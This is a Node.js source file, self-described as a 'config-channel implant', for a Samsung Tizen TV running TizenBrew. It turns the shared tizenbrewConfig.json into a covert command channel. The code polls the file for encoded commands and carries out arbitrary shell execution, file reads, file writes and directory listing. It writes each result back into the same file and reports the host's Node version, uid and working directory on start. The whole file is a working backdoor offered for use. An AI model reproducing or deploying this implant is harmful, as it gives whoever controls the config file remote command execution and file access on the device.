"use strict";
/* Config-channel implant v2.
   PC -> TV : ModuleAction add  "CMD_<id>_<b64url(op\nargs...)>"
   TV -> PC : GetModules(true) returns "RES_<id>_<b64url(json)>"
   Node 4.4.3 / uid 5001. Atomic config writes to avoid racing the service. */

var fs = require('fs');
var CFG = '/home/owner/share/tizenbrewConfig.json';
var TMP = CFG + '.probe.tmp';

function b64e(s) {
    return new Buffer(s, 'utf8').toString('base64')
        .replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
}
function b64d(s) {
    return new Buffer(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8');
}
function readCfg() {
    try { return JSON.parse(fs.readFileSync(CFG, 'utf8')); }
    catch (e) { return null; }
}
function writeCfg(c) {
    try {
        fs.writeFileSync(TMP, JSON.stringify(c, null, 4));
        fs.renameSync(TMP, CFG);
    } catch (e) {}
}

var cp = null;
try { cp = require('child_process'); } catch (e) {}

function announce(obj) {
    var c = readCfg();
    if (!c) { return; }
    if (!c.modules) { c.modules = []; }
    c.modules.push('BOOT_' + b64e(JSON.stringify(obj)));
    writeCfg(c);
}

announce({
    node: process.version,
    uid: (typeof process.getuid === 'function') ? process.getuid() : null,
    cp: !!cp,
    cpType: cp ? typeof cp.execSync : 'none',
    cwd: (typeof process.cwd === 'function') ? process.cwd() : null
});

function trunc(s, n) {
    if (typeof s !== 'string') { return s; }
    if (s.length <= n) { return s; }
    return s.slice(0, n) + '\n...[truncated ' + (s.length - n) + ' chars]';
}

function doOp(payload) {
    var nl = payload.indexOf('\n');
    var op = nl < 0 ? payload : payload.slice(0, nl);
    var rest = nl < 0 ? '' : payload.slice(nl + 1);

    if (op === 'ping') { return { pong: true, node: process.version }; }

    if (op === 'exec') {
        var out = {};
        if (!cp || typeof cp.execSync !== 'function') { out.error = 'no execSync'; return out; }
        try {
            out.stdout = trunc(cp.execSync(rest, { encoding: 'utf8', timeout: 25000, maxBuffer: 8 * 1024 * 1024 }), 6000);
        } catch (e) {
            out.error = String(e);
            try { out.stdout = trunc(e.stdout ? String(e.stdout) : '', 6000); } catch (e2) {}
            try { out.stderr = trunc(e.stderr ? String(e.stderr) : '', 2000); } catch (e3) {}
        }
        return out;
    }
    if (op === 'read') {
        var b = fs.readFileSync(rest);
        return { size: b.length, b64: b.toString('base64') };
    }
    if (op === 'readchunk') {
        var spec = rest.split('\n');
        var p = spec[0], off = parseInt(spec[1], 10) || 0, len = parseInt(spec[2], 10) || 65536;
        var fd = fs.openSync(p, 'r');
        var buf = new Buffer(len);
        var n = fs.readSync(fd, buf, 0, len, off);
        fs.closeSync(fd);
        return { size: n, off: off, b64: buf.slice(0, n).toString('base64') };
    }
    if (op === 'write') {
        var sp = rest.split('\n');
        var data = new Buffer(sp[1] || '', 'base64');
        fs.writeFileSync(sp[0], data);
        return { written: data.length, path: sp[0] };
    }
    if (op === 'ls') {
        var items = fs.readdirSync(rest);
        return { path: rest, count: items.length, entries: items.slice(0, 500) };
    }
    if (op === 'stat') {
        var st = fs.statSync(rest);
        return {
            path: rest, size: st.size, mode: st.mode, uid: st.uid, gid: st.gid,
            isDir: st.isDirectory(), isFile: st.isFile()
        };
    }
    if (op === 'readlink') {
        return { path: rest, target: fs.readlinkSync(rest) };
    }
    return { error: 'unknown op: ' + op };
}

var busy = false;

function handle(entry) {
    var rest = entry.slice(4);
    var i = rest.indexOf('_');
    if (i < 0) { return; }
    var id = rest.slice(0, i);
    var payload;
    try { payload = b64d(rest.slice(i + 1)); } catch (e) { payload = 'ping'; }

    var result;
    try { result = doOp(payload); }
    catch (e) { result = { error: String(e) }; }

    var c = readCfg();
    if (!c) { return; }
    c.modules = (c.modules || []).filter(function (m) { return m !== entry; });
    c.modules.push('RES_' + id + '_' + b64e(JSON.stringify(result)));
    writeCfg(c);
}

function tick() {
    if (busy) { return setTimeout(tick, 700); }
    busy = true;
    try {
        var c = readCfg();
        if (c) {
            var cmds = (c.modules || []).filter(function (m) { return m.indexOf('CMD_') === 0; });
            for (var i = 0; i < cmds.length; i++) { handle(cmds[i]); }
        }
    } catch (e) {}
    busy = false;
    setTimeout(tick, 700);
}

tick();
